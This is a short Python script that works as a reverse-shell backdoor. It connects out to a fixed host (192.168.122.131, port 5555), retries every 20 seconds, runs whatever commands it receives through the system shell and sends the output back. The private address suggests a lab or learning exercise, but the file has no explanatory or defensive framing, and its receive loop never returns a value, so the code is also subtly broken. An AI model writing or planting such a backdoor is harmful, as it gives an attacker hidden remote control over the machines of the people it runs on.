import socket
import time
import json
import subprocess



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())


def recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
        except ValueError:
            continue


def connection():
    while True:
            time.sleep(20)
            try:
                s.connect(('192.168.122.131', 5555))
                shell()
                s.close()
                break
            except:
                connection()

def shell():
     while True:
          command = recv()
          if command == 'exit':
               break
          else:
               execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               result = execute.stdout.read() + execute.stderr.read()
               result = result.decode()
               send(result)

               
